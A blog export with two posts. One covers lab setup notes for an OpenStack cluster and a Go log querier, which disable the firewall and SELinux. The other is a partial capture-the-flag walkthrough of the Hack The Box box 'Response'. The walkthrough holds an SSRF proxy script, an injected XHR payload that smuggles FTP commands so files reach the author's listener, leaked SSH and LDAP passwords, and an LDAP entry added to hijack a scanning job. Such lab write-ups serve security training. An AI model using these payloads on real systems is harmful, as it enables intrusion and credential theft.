[{"title":"Distributed Log Querier","path":"/2023/09/30/Openstack/","content":"制作一个Mini Project，使用openstack搭建1个控制节点，4个计算节点，然后使用分布式日志查询器查询日志 网络结构 controller compute compute02 compute03 compute04 ens33 192.168.10.10 192.168.10.20 192.168.10.30 192.168.10.40 192.168.10.50 ens34 192.168.20.10 192.168.20.20 192.168.20.30 192.168.20.40 192.168.20.50 ens33和34是网络接口 Openstack搭建前期准备资源准备点击下载资源包云盘 虚拟机配置我所使用的是Vmware 16 Pro版本 选择更改设置 添加一张新的网卡，两个都选择仅主机模式，并按照上图填写对应的ip地址 新建虚拟机创建新的虚拟机-&gt;选择centos7 iso -&gt;分配磁盘大小40G-&gt;点击完成修改虚拟机配置 按照上图配置内存和处理器，然后添加网络适配器，选择刚刚设置好的两个网卡 初步配置第一台虚拟机开机后设置安装位置，选择40G硬盘，done配置用户名和密码，重启重启完成后，输入用户名root，输入密码（注意linux中输入密码是不显示的），输入完成按回车接下来编辑网卡设置 1234567vi /etc/sysconfig/network-scripts/ifcfg-ens33#按i进入编辑模式BOOTPROTO=staticONBOTT=yesIPADDR=192.168.10.10NETMASK=255.255.255.0#修改完上面的内容后，按esc-&gt;冒号:wq退出即可 重启一下 再修改一下另一个网卡 123vi /etc/sysconfig/network-scripts/ifcfg-ens34IPADDR=192.168.20.10NETMASK=255.255.255.0 关闭防火墙 12systemctl stop firewalldsystemctl disable firewalld 关闭安全策略 123setenforce 0vi /etc/selinux/configSELINUX=disable 设置hosts 123456vi /etc/hosts192.168.10.10 controller192.168.10.20 compute192.168.10.30 compute02192.168.10.40 compute03192.168.10.50 compute04 到这里基础步骤就完成啦！ 初步配置其他虚拟机将第一台机器关机，右击克隆 一路下一步即可我建议先克隆一台机器，当compute一个节点配置完毕后，再克隆配置好的compute 配置compute节点同样也是先改好ip地址然后通过ssh连接 1234567891011vi /etc/sysconfig/network-scripts/ifcfg-ens33BOOTPROTO=staticONBOTT=yesIPADDR=192.168.10.20NETMASK=255.255.255.0systemctl restart networkvi /etc/sysconfig/network-scripts/ifcfg-ens34IPADDR=192.168.20.20NETMASK=255.255.255.0 配置源1234#controller中hostnamectl set-hostname controller#computehostnamectl set-hostname compute 上传两个ISO 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#controlleryum 源配置vi /etc/yum.repos.d/local.repo[centos]name=centosenabled=1gpgcheck=0baseurl=file:///opt/centos[iaas]name=iaasenabled=1gpgcheck=0baseurl=file:///opt/iaas/iaas-repomkdir /opt/centosmkdir /opt/iaas----------------------------------------------------#compute中yum 源配置rm -rf /etc/yum.repos.d/*vi /etc/yum.repos.d/ftp.repo[centos]name=centosenabled=1gpgcheck=0baseurl=ftp://192.168.10.10/centos[iaas]name=iaasenabled=1gpgcheck=0baseurl=ftp://192.168.10.10/iaas/iaas-repo#controller中mount -o loop CentOS-7-x86_64-DVD-2009.iso /mnt/cp -rvf /mnt/* /opt/centosumount /mnt/mount -o loop openstack.iso /mnt/cp -rvf /mnt/* /opt/iaas/umount /mnt/yum repolistrm -rf /etc/yum.repos.d/C*yum install vsftpd -yvi /etc/vsftpd/vsftpd.confanon_root=/optsystemctl restart vsftpdsystemctl enable vsftpd 安装Openstack12#controller&amp;computeyum install openstack-iaas -y 安装完成刷新一下终端，就可以看到 接下来我们要配置openstack文件在controller中 1234567891011121314151617181920212223242526272829303132vi /etc/openstack/openrc.shctrl+v+G+d:%s/PASS=/PASS=000000/gHOST_IP=192.168.10.10#Controller Server hostname. example:controllerHOST_NAME=controller#Compute Node Manager IP. example:x.x.x.xHOST_IP_NODE=192.168.10.20,192.168.10.30,192.168.10.40,192.168.10.50#Compute Node hostname. example:computeHOST_NAME_NODE=compute#--------------------Chrony Config-------------------###Controller network segment IP. example:x.x.0.0/16(x.x.x.0/24)network_segment_IP=192.168.0.0/16#External Network Interface. example:eth1INTERFACE_NAME=ens34#External Network The Physical Adapter. example:providerPhysical_NAME=provider#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101minvlan=1#Last Vlan ID in VLAN RANGE for VLAN Network. example:200maxvlan=400#需要填disk可以随便填#Cinder Block Disk. example:md126p3BLOCK_DISK=sdb#The NODE Object Disk for Swift. example:md126p4.OBJECT_DISK=sdc#The NODE IP for Swift Storage Network. example:x.x.x.x.STORAGE_LOCAL_NET_IP=192.168.10.20 其他地方按照提示样例写就可以然后将这份配置文件也传到compute节点中 12scp /etc/openstack/openrc.sh root@192.168.10.20:/etc/openstack/输入密码 安装主要组件1234567891011121314#controller&amp;computeiaas-pre-host.sh重新连接ssh#controlleriaas-install-mysql.shiaas-install-keystone.shiaas-install-glance.shiaas-install-placement.shiaas-install-nova-controller.shiaas-install-neutron-controller.shiaas-install-dashboard.sh#computeiaas-install-nova-compute.shiaas-install-neutron-compute.sh 分布式日志查询在两台机器上安装go 123456789tar -zxf go1.17.2.linux-amd64.tar.gz -C /usr/localvi /etc/profile#go 环境变量export GO111MODULE=onexport GOROOT=/usr/local/goexport GOPATH=/home/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile 代码链接https://github.com/44maker/DistributedLogQuerier将代码上传到两台机器到这里所有的配置工作就完成啦可以将机器关闭，然后克隆compute节点，再复制3台机器，安装上文讲过的配置一下ip地址，ssh连接上 Test123456#在所有compute节点中go run server.go#在controller中go build client.go./client [query] [log file name]example: ./client name 单元测试123456#生成测试的log文件go run generate_testfiles.go#在所有compute节点中go run server.go#在controller中go test -v client_test.go 参考结果","tags":["运维","云计算"],"categories":["开发笔记"]},{"title":"HTB: Response","path":"/2023/09/02/htb-response/","content":"❗本文由于图床挂了，保存的图片都丢失了😭，希望大家引以为戒做好备份工作。 非常抱歉，由于我的原因给大家带来了阅读体验上的困扰！❗This article has lost all saved images due to a problem with the image hosting service. 😭 Please take this as a lesson and remember to always back up your data. I sincerely apologize for any inconvenience caused to your reading experience due to our mistake! Box Info Name Response Difficulty: Insane Points: 50 Release: 14 May 2022 IP: 10.10.11.163 OS: Linux Radar Graph: 实战信息收集端口扫描123456789101112131415161718┌──(kali㉿kali)-[~/HTB] └─$ rustscan -a 10.10.11.163 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| | | .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ | `-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at &quot;/home/kali/.rustscan.toml&quot; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. Open 10.10.11.163:22 Open 10.10.11.163:80 1234567891011121314151617181920┌──(kali㉿kali)-[~/HTB]└─$ nmap -sC -sV -p22,80 10.10.11.163Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 03:54 ESTNmap scan report for 10.10.11.163Host is up (0.082s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e9a4394afb065d5782fc4a0e0be46b25 (RSA)| 256 a323e498dfb6911bf2ac2f1cc1469b15 (ECDSA)|_ 256 fb105fda55a66b953df2e85c0336ff31 (ED25519)80/tcp open http nginx 1.21.6|_http-title: Did not follow redirect to http://www.response.htb|_http-server-header: nginx/1.21.6Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds 目录扫描80端口显示了一个网页 gobuster跑一下 1234567891011121314151617181920212223┌──(kali㉿kali)-[~/HTB]└─$ gobuster dir -u http://www.response.htb -w ~/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories.txt ===============================================================Gobuster v3.4by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://www.response.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /home/kali/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.4[+] Timeout: 10s===============================================================2023/01/15 04:02:42 Starting gobuster in directory enumeration mode===============================================================/css (Status: 301) [Size: 169] [--&gt; http://www.response.htb/css/]/img (Status: 301) [Size: 169] [--&gt; http://www.response.htb/img/]/assets (Status: 301) [Size: 169] [--&gt; http://www.response.htb/assets/]/fonts (Status: 301) [Size: 169] [--&gt; http://www.response.htb/fonts/]/status (Status: 301) [Size: 169] [--&gt; http://www.response.htb/status/] assets和status里可能有东西，再跑一下 assets 403 这个proxy感觉有门路 经过Base64转换得到结果 &#123;&quot;servers&quot;:[&#123;&quot;id&quot;:1,&quot;ip&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;Test Server&quot;&#125;]&#125; 那么拿status&#x2F;main.js.php中的get_chat_status尝试一下 得到结果 &#123;&quot;status&quot;:&quot;running&quot;,&quot;vhost&quot;:&quot;chat.response.htb&quot;&#125; 用户权限得到了chat.response.htb之后无论是添加hosts记录还是直接访问都无法打开网页，那么尝一下通过之前json格式的设置。 并且用api.response.htb做跳板 &#123;&quot;api_version&quot;:&quot;1.0&quot;,&quot;endpoints&quot;:[&#123;&quot;desc&quot;:&quot;get api status&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;route&quot;:&quot;/&quot;&#125;,&#123;&quot;desc&quot;:&quot;get internal chat status&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;route&quot;:&quot;/get_chat_status&quot;&#125;,&#123;&quot;desc&quot;:&quot;get monitored servers list&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;route&quot;:&quot;/get_servers&quot;&#125;],&quot;status&quot;:&quot;running&quot;&#125; 写个python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import base64from http.server import BaseHTTPRequestHandler, HTTPServerimport randomimport reimport requestsfrom socketserver import ThreadingMixInimport sysimport threadingimport timehostName = &quot;0.0.0.0&quot;serverPort = 80class MyServer(BaseHTTPRequestHandler): def do_GET(self): self.request_handler(&#x27;GET&#x27;) def do_POST(self): self.request_handler(&#x27;POST&#x27;) def request_handler(self, method): self.random_number = random.randint(100000,999999) path = self.path myurl = &#x27;http://chat.response.htb&#x27; + path print(f&quot;[&#123;self.random_number&#125;] &#123;method&#125; &#123;myurl&#125;&quot;) if method == &#x27;POST&#x27;: content_len = int(self.headers.get(&#x27;Content-Length&#x27;)) post_body = self.rfile.read(content_len) print(f&quot;[&#123;self.random_number&#125;] body: &#123;post_body&#125;&quot;) else: post_body = None digest = self.get_digest(myurl) data = self.send_request_to_proxy(myurl, method, digest, post_body) self.send_response(200) if path.endswith(&#x27;.js&#x27;): self.send_header(&quot;Content-type&quot;, &quot;application/javascript&quot;) elif path.endswith(&#x27;.css&#x27;): self.send_header(&quot;Content-type&quot;, &quot;text/css&quot;) else: self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() self.wfile.write(data) def get_digest(self, myurl): url = &#x27;http://www.response.htb/status/main.js.php&#x27; cookies = &#123;&#x27;PHPSESSID&#x27;: myurl&#125; response = requests.get(url, cookies=cookies) response.raise_for_status() assert &#x27;session_digest&#x27; in response.text session_digest = re.search(r&#x27;\\&#x27;session_digest\\&#x27;:\\&#x27;([^\\&#x27;]+)&#x27;, response.text).group(1) #print(f&quot;[&#123;self.random_number&#125;] digest: &#123;session_digest&#125;&quot;) return session_digest def send_request_to_proxy(self, myurl, method, digest, body=None): url = &#x27;http://proxy.response.htb/fetch&#x27; data = &#123;&#x27;url&#x27;: myurl, &#x27;url_digest&#x27;: digest, &#x27;method&#x27;: method, &#x27;session&#x27;: &#x27;1a5455b829845168770cb337f1a05507&#x27;, &#x27;session_digest&#x27;: &#x27;d27e297b494df599e72985e6e9a166751d7de74136df9d74468aac0818c29125&#x27;&#125; if method == &#x27;POST&#x27;: data[&#x27;body&#x27;] = base64.b64encode(body) response = requests.post(url, json=data) response.raise_for_status() assert &#x27;body&#x27; in response.text and &#x27;status_code&#x27; in response.text body = response.json()[&#x27;body&#x27;] status_code = response.json()[&#x27;status_code&#x27;] print(f&quot;[&#123;self.random_number&#125;] status_code from proxy: &#123;status_code&#125;; length of body: &#123;len(body)&#125;&quot;) decoded_string = base64.b64decode(body) return decoded_string# This part is for multithreaing.# See https://stackoverflow.com/questions/14088294/multithreaded-web-server-in-python# Multithreading is necessary because a lot of requests are made when opening the chat application.# Some requests take several seconds to complete. I don&#x27;t want these requests to hold back the other ones.class ThreadedHTTPServer(ThreadingMixIn, HTTPServer): &quot;&quot;&quot;Handle requests in a separate thread.&quot;&quot;&quot;def main(): print(&quot;Edit your /etc/hosts like this:&quot;) print(&quot;10.10.11.163 www.response.htb proxy.response.htb # HTB machine IP&quot;) print(&quot;10.10.16.29 chat.response.htb # my VPN IP&quot;) print(&quot;While runing this script, open http://chat.response.htb/ in the web browser &quot;) # Without multithreading: #webServer = HTTPServer((hostName, serverPort), MyServer) # With multithreading (choose one or the other): webServer = ThreadedHTTPServer((hostName, serverPort), MyServer) print(&quot;Server started http://%s:%s&quot; % (hostName, serverPort)) try: webServer.serve_forever() except KeyboardInterrupt: pass webServer.server_close() print(&quot;Server stopped.&quot;)if __name__ == &quot;__main__&quot;: main() 打开网页后发现 下载后查询README.md配置文件在server中的index.js 发现了用户名和密码是guest 和 guest 仅存的员工聊聊天 这条路没得走了再看看下载下来的源码其中有个ldap服务 Idap服务安装 1sudo apt install slapd 配置 1sudo dpkg-reconfigure slapd 选择no 填入response.htb organization name： response 然后创建一个Idif file 123456789101112dn: ou=users,dc=response,dc=htbchangetype: addobjectClass: organizationalPersonsn:testcn:testdn: uid=admin,ou=users,dc=response,dc=htbchangetype: addobjectClass: inetOrgPersonuserPassword: passwordsn: testcn: test 启动服务 1service slapd start 1ldapadd -x -D &quot;cn=admin,dc=response,dc=htb&quot; -w &#x27;password&#x27; -H ldap://127.0.0.1 -f group.ldif FTP聊完天给了我们线索 1234567 (yourself)okbobawesome!i moved the internal ftp server... the new ip address is 172.18.0.2 and it is listening on port 2121. the creds are ftp_user / Secret12345outgoing traffic from the server is currently allowed, but i will adjust the firewall to fix thatbtw. would be great if you could send me the javascript article you were talking about 172.18.0.2 2121 ftp_user Secret12345 创建一个html，为什么要创建可以看这篇文章👉 https://www.serv-u.com/resources/tutorial/pasv-response-epsv-port-pbsz-rein-ftp-command 12345678910111213&lt;script&gt;var xhr = new XMLHttpRequest();xhr.open(&quot;POST&quot;, &#x27;http://172.18.0.2:2121/&#x27;,true);xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);xhr.onreadystatechange = function() &#123;if (this.readyState === XMLHttpRequest.DONE &amp;&amp;this.status === 200) &#123; &#125;&#125;xhr.send(&quot;USER ftp_user\\r PASS Secret12345\\r PORT 10,10,16,29,10,15\\r LIST\\r &quot;);&lt;/script&gt; 本机ip就是10,10,16,29 10,15意味着10*256+15&#x3D;2575 然后运行 1python3 -m http.server 9001 1nc -lvnp 2575 之前bob不是找admin有事么，发个链接给他（上面的html文件命名为1.html） 1http://我的ip:9001/1.html 123456┌──(kali㉿kali)-[~/HTB]└─$ nc -lvnp 2575listening on [any] 2575 ...connect to [10.10.16.29] from (UNKNOWN) [10.10.11.163] 39036-rw-r--r-- 1 root root 74 Mar 16 2022 creds.txt 给了我认证信息 那我再修改一下上面的代码 12345678910111213&lt;script&gt;var xhr = new XMLHttpRequest();xhr.open(&quot;POST&quot;, &#x27;http://172.18.0.2:2121/&#x27;,true);xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);xhr.onreadystatechange = function() &#123;if (this.readyState === XMLHttpRequest.DONE &amp;&amp;this.status === 200) &#123; &#125;&#125;xhr.send(&quot;USER ftp_user\\r PASS Secret12345\\r PORT 10,10,16,29,10,15\\r RETR creds.txt\\r &quot;);&lt;/script&gt; 得到结果 12345678ftp---ftp_user / Secret12345ssh---bob / F6uXVwEjdZ46fsbXDmQK7YPY3OM ssh试试 🎉🎉🎉 1234567891011121314151617181920212223242526┌──(kali㉿kali)-[~/HTB] └─$ ssh bob@10.10.11.163 The authenticity of host &#x27;10.10.11.163 (10.10.11.163)&#x27; can&#x27;t be established. ED25519 key fingerprint is SHA256:iPHy1XV7afTauFvMhysv/Ynl8yV39A02ZsTLR42/sd0. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#x27;10.10.11.163&#x27; (ED25519) to the list of known hosts. bob@10.10.11.163&#x27;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) System load: 1.69 Usage of /: 79.2% of 8.54GB Memory usage: 29% Swap usage: 0% Processes: 287 Users logged in: 0 IPv4 address for br-01fdb3f286b8: 172.19.0.1 IPv4 address for br-feb0146a542b: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.163 IPv6 address for eth0: dead:beef::250:56ff:feb9:76edLast login: Sun Jan 15 04:14:32 2023 from 10.10.14.10bob@response:~$ lsuser.txtbob@response:~$ cat user.txtcd**************************954 横向移动晃了一圈除了用户scryh其他没什么可利用的 进入目录 12345678910111213bob@response:/home/scryh$ ls -liahtotal 40K532257 drwxr-xr-x 7 scryh scryh 4.0K Mar 11 2022 .524290 drwxr-xr-x 4 root root 4.0K Mar 4 2022 ..532271 lrwxrwxrwx 1 root root 9 Mar 4 2022 .bash_history -&gt; /dev/null532260 -rw-r--r-- 1 scryh scryh 220 Feb 25 2020 .bash_logout532259 -rw-r--r-- 1 scryh scryh 3.7K Feb 25 2020 .bashrc532263 drwx------ 3 scryh scryh 4.0K Mar 4 2022 .cache565333 drwx------ 3 scryh scryh 4.0K Mar 11 2022 .config173010 drwx------ 2 scryh scryh 4.0K Mar 16 2022 incident_2022-3-042532258 -rw-r--r-- 1 scryh scryh 807 Feb 25 2020 .profile173019 drwxr-xr-x 5 scryh scryh 4.0K Mar 17 2022 scan532261 drwx------ 2 scryh scryh 4.0K Mar 10 2022 .ssh incident没权限访问，进scan看看 123456789bob@response:/home/scryh/scan$ ls -liahtotal 28K173019 drwxr-xr-x 5 scryh scryh 4.0K Mar 17 2022 .532257 drwxr-xr-x 7 scryh scryh 4.0K Mar 11 2022 ..173020 drwxr-xr-x 4 scryh scryh 4.0K Mar 3 2022 data173289 drwxr-xr-x 2 scryh scryh 4.0K Jan 15 12:23 output156892 -rwxr-xr-x 1 scryh scryh 3.4K Mar 4 2022 scan.sh173291 drwxr-xr-x 2 scryh scryh 4.0K Feb 15 2022 scripts156894 -rwxr-xr-x 1 scryh scryh 1.3K Mar 17 2022 send_report.py 在scripts中有三个nmap的脚本 1234567bob@response:/home/scryh/scan/scripts$ ls -liahtotal 68K173291 drwxr-xr-x 2 scryh scryh 4.0K Feb 15 2022 .173019 drwxr-xr-x 5 scryh scryh 4.0K Mar 17 2022 ..173292 -rw-r--r-- 1 scryh scryh 9.5K Mar 3 2022 ssl-cert.nse173293 -rw-r--r-- 1 scryh scryh 39K Feb 15 2022 ssl-enum-ciphers.nse173294 -rw-r--r-- 1 scryh scryh 7.6K Feb 15 2022 ssl-heartbleed.nse 那么接下去的重点是nmap的三个脚本，理解一下脚本的作用，说不定可以把172.18.0.3改为我们自己的，这样就可以看出xml和pdf里面有什么了 123456789101112131415161718local NON_VERBOSE_FIELDS = &#123; &quot;commonName&quot;, &quot;organizationName&quot;, &quot;stateOrProvinceName&quot;, &quot;countryName&quot; &#125; -- Test to see if the string is UTF-16 and transcode it if possible local function maybe_decode(str) -- If length is not even, then return as-is if #str &lt; 2 or #str % 2 == 1 then return str end if str:byte(1) &gt; 0 and str:byte(2) == 0 then -- little-endian UTF-16 return unicode.transcode(str, unicode.utf16_dec, unicode.utf8_enc, false, nil) elseif str:byte(1) == 0 and str:byte(2) &gt; 0 then -- big-endian UTF-16 return unicode.transcode(str, unicode.utf16_dec, unicode.utf8_enc, true, nil) else return str endend 发现有四个参数，一些名称，在data文件夹里可以看到 1234567891011121314151617bob@response:/home/scryh/scan/data/countryName$ lsAD AN AW BF BN BW CG CO CY DZ ET GA GI GS HN IM JE KI KZ LS MD MM MT NA NO PE PN RE SC SK ST TF TN UA VC WSAE AO AX BG BO BY CH CR CZ EC FI GB GL GT HR IN JM KM LA LT ME MN MU NC NP PF PR RO SD SL SV TG TO UG VE XKAF AQ AZ BH BQ BZ CI CS DE EE FJ GD GM GU HT IO JO KN LB LU MF MO MV NE NR PG PS RS SE SM SX TH TR UM VG YEAG AR BA BI BR CA CK CU DJ EG FK GE GN GW HU IQ JP KP LC LV MG MP MW NF NU PH PT RU SG SN SY TJ TT US VI YTAI AS BB BJ BS CC CL CV DK EH FM GF GP GY ID IR KE KR LI LY MH MQ MX NG NZ PK PW RW SH SO SZ TK TV UY VN ZAAL AT BD BL BT CD CM CW DM ER FO GG GQ HK IE IS KG KW LK MA MK MR MY NI OM PL PY SA SI SR TC TL TW UZ VU ZMAM AU BE BM BV CF CN CX DO ES FR GH GR HM IL IT KH KY LR MC ML MS MZ NL PA PM QA SB SJ SS TD TM TZ VA WF ZWbob@response:/home/scryh/scan/data/countryName$ cat CNChinabob@response:/home/scryh/scan/data/countryName$ cd ../bob@response:/home/scryh/scan/data$ cd stateOrProvinceName/bob@response:/home/scryh/scan/data/stateOrProvinceName$ lsAlabama Arizona California Florida Hawaii Indiana Maryland Nebraska Some-State Texas Virginia Wisconsin Zionbob@response:/home/scryh/scan/data/stateOrProvinceName$ cat California California is a state in the Western United States.bob@response:/home/scryh/scan/data/stateOrProvinceName$ 发现stateOrProvinceName的内容比较长，可以构造../../../../.ssh/id_rsa 再看一下output 12345678bob@response:/home/scryh/scan/output$ cat log.txt scanning server ip 172.18.0.3- retrieved manager uid: marie- manager mail address: marie.w@response-test.htb- failed to retrieve SMTP server for domain &quot;response-test.htb&quot; locally- retrieved SMTP server for domain &quot;response-test.htb&quot;: mail.response-test.htb.- retrieved ip address of SMTP server: 172.18.0.3- sending report output/scan_172.18.0.3.pdf to customer marie.w@response-test.htb via SMTP server 172.18.0.3 跑一下pspy 12345678910111213141516171819202023/01/21 08:31:01 CMD: UID=0 PID=34603 | sudo -u scryh bash -c cd /home/scryh/scan;./scan.sh 2023/01/21 08:31:01 CMD: UID=1000 PID=34605 | /bin/bash ./scan.sh 2023/01/21 08:31:01 CMD: UID=1000 PID=34604 | bash -c cd /home/scryh/scan;./scan.sh 2023/01/21 08:31:01 CMD: UID=1000 PID=34611 | grep ipHostNumber 2023/01/21 08:31:01 CMD: UID=1000 PID=34610 | /bin/bash ./scan.sh 2023/01/21 08:31:01 CMD: UID=1000 PID=34609 | /bin/bash ./scan.sh 2023/01/21 08:31:01 CMD: UID=1000 PID=34612 | cut -d -f2 2023/01/21 08:31:01 CMD: UID=1000 PID=34613 | nmap -v -Pn 172.18.0.3 -p 443 --script scripts/ssl-enum-ciphers,scripts/ssl-cert,scripts/ssl-heartbleed -oX output/scan_172.18.0.3.xml 2023/01/21 08:31:14 CMD: UID=1000 PID=34614 | wkhtmltopdf output/scan_172.18.0.3.xml output/scan_172.18.0.3.pdf 2023/01/21 08:34:15 CMD: UID=1000 PID=34852 | /usr/bin/ldapsearch -x -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -s sub -b ou=customers,dc=response,dc=htb (uid=marie) 2023/01/21 08:35:15 CMD: UID=1000 PID=34959 | /usr/bin/env python3 ./send_report.py 172.18.0.3 marie.w@response-test.htb output/scan_172.18.0.3.pdf 2023/01/21 08:35:15 CMD: UID=0 PID=34960 | /bin/bash /root/ldap/restore_ldap.sh 2023/01/21 08:35:15 CMD: UID=0 PID=34961 | cp /root/ldap/data.mdb /root/docker/openldap/data/slapd/database/ 2023/01/21 08:35:15 CMD: UID=0 PID=34962 | docker inspect -f &#123;&#123;range.NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125; testserver 2023/01/21 08:35:15 CMD: UID=0 PID=34968 | ldapmodify -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -f /root/ldap/testserver.ldif 2023/01/21 08:37:15 CMD: UID=1000 PID=35100 | python3 ./send_report.py 172.18.0.3 marie.w@response-test.htb output/scan_172.18.0.3.pdf 2023/01/21 08:37:15 CMD: UID=0 PID=35101 | /bin/bash /root/ldap/restore_ldap.sh 2023/01/21 08:37:15 CMD: UID=0 PID=35102 | cp /root/ldap/data.mdb /root/docker/openldap/data/slapd/database/ 2023/01/21 08:37:15 CMD: UID=0 PID=35103 | docker inspect -f &#123;&#123;range.NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125; testserver 2023/01/21 08:37:15 CMD: UID=0 PID=35109 | ldapmodify -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -f /root/ldap/testserver.ldif 拿出命令跑一下，记得补充变量 12345678910111213141516171819202122232425262728bob@response:/home/scryh/scan$ bind_dn=&#x27;cn=admin,dc=response,dc=htb&#x27;bob@response:/home/scryh/scan$ pwd=&#x27;aU4EZxEAOnimLNzk3&#x27;bob@response:/home/scryh/scan$ /usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b &#x27;ou=servers,dc=response,dc=htb&#x27; &#x27;(objectclass=ipHost)&#x27;|grep ipHostNumber|cut -d &#x27; &#x27; -f2 #这个命令是scan.sh里的部分命令172.18.0.3bob@response:/home/scryh/scan/scripts$ /usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b &#x27;ou=servers,dc=response,dc=htb&#x27; &#x27;(objectclass=ipHost)&#x27;# extended LDIF## LDAPv3# base &lt;ou=servers,dc=response,dc=htb&gt; with scope subtree# filter: (objectclass=ipHost)# requesting: ALL## TestServer, servers, response.htbdn: cn=TestServer,ou=servers,dc=response,dc=htbobjectClass: topobjectClass: ipHostobjectClass: devicecn: TestServermanager: uid=marie,ou=customers,dc=response,dc=htbipHostNumber: 172.18.0.3# search resultsearch: 2result: 0 Success# numResponses: 2# numEntries: 1 确认了扫描的是172.18.0.3 # TestServer, servers, response.htb这部分就是我们要伪造服务所需要注意的地方了 开始伪造 12345678910bob@response:~$ vim server.ldifdn: cn=TestServer2,ou=servers,dc=response,dc=htb changetype: add objectClass: top objectClass: ipHost objectClass: device cn: TestServer2 manager: uid=kali,ou=customers,dc=response,dc=htb ipHostNumber: 10.10.14.78 添加服务 1ldapmodify -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -f server.ldif 又因为pspy扫出来 ipHost常会重置 所以我们要写一个定时脚本 12345#!/bin/bashwhile [ 1 -eq 1 ]; do ldapmodify -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -f server.ldif sleep 3done 12chmod +x test.sh./test.sh &amp; 发现 12023/01/21 10:42:14 CMD: UID=1000 PID=44453 | nmap -v -Pn 10.10.14.78 -p 443 --script scripts/ssl-enum-ciphers,scripts/ssl-cert,scripts/ssl-heartbleed -oX output/scan_10.10.14.78.xml 已经nmap在扫了 那么再添加发送邮件的信息 查看一下格式 123456789101112131415161718192021bob@response:~$ /usr/bin/ldapsearch -x -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -s sub -b ou=customers,dc=response,dc=htb &#x27;(uid=marie)&#x27; # extended LDIF## LDAPv3# base &lt;ou=customers,dc=response,dc=htb&gt; with scope subtree# filter: (uid=marie)# requesting: ALL## marie, customers, response.htbdn: uid=marie,ou=customers,dc=response,dc=htbobjectClass: inetOrgPersoncn: Marie Wiliamssn: Marieuid: mariemail: marie.w@response-test.htb# search resultsearch: 2result: 0 Success# numResponses: 2# numEntries: 1 vim adduser.ldif 1234567dn: uid=kali,ou=customers,dc=response,dc=htbchangetype: addobjectClass: inetOrgPersoncn: Marie Wiliamssn: Marieuid: kalimail: kali@response-test.htb 1ldapmodify -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -f adduser.ldif 看一下是否写入 1234567891011121314151617181920212223bob@response:~$ ldapsearch -x -D cn=admin,dc=response,dc=htb -w aU4EZxEAOnimLNzk3 -s sub -b ou=customers,dc=response,dc=htb &#x27;(uid=kali)&#x27;# extended LDIF## LDAPv3# base &lt;ou=customers,dc=response,dc=htb&gt; with scope subtree# filter: (uid=kali)# requesting: ALL## kali, customers, response.htbdn: uid=kali,ou=customers,dc=response,dc=htbobjectClass: inetOrgPersoncn: Marie Wiliamssn: Marieuid: kalimail: kali@response-test.htb# search resultsearch: 2result: 0 Success# numResponses: 2# numEntries: 1 之后还要搭建自己的https服务 生成证书 12345678910111213141516171819202122232425262728293031323334──(kali㉿kali)-[~/HTB/Response]└─$ openssl genrsa -out server.key 4096 ┌──(kali㉿kali)-[~/HTB/Response]└─$ openssl req -new -key server.key -out server.csrYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#x27;.&#x27;, the field will be left blank.-----Country Name (2 letter code) [AU]:AUState or Province Name 